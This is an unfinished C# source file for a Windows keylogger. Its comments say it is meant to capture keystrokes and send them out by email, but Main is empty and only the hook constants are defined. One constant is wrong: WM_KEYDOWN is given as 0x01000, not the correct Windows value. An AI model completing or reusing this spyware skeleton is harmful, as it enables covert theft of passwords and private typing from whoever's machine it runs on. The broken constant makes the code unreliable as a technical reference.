using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;//IMPORT Dlls to read specific keystroke information from specific memory
using System.Diagnostics;
using System.Windows.Forms;//Need to convert keystroke into readable
using System.IO;//Save and Send by email

//ADD FRAMEWORK : system.windows.fomrs
namespace keylogger
{
    class Program
    {
        private static int WH_KEYBOARD_L = 13;
        private static int WM_KEYDOWN = 0x01000;
        private static IntPtr hook = IntPtr.Zero;
        static void Main(string[] args)
        {
        }
    }
}
